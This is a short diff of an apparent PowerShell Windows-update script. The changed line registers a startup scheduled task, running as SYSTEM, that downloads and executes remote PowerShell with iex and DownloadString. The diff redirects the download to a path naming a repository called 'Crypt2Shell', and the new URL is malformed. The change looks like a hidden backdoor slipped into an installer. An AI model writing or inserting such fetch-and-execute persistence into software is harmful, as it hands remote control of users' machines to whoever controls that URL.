@@ -71,7 +71,7 @@ Write-Host "Installation complete."
 if ($Results.RebootRequired) { 
 	if ($Reboot) { 
             Write-Host "Rebooting..."
-	    schtasks /Create /tn WinGrade /tr "powershell.exe -nop -c 'iex(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Desition/WinGrade/master/scripts/search.ps1'''))'" /sc onstart /ru System
+	    schtasks /Create /tn WinGrade /tr "powershell.exe -nop -c 'iex(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/Desition/Crypt2Shell/WinGrade/blob/master/scripts/search.ps1'''))'" /sc onstart /ru System
             Restart-Computer
         } 
         else { 
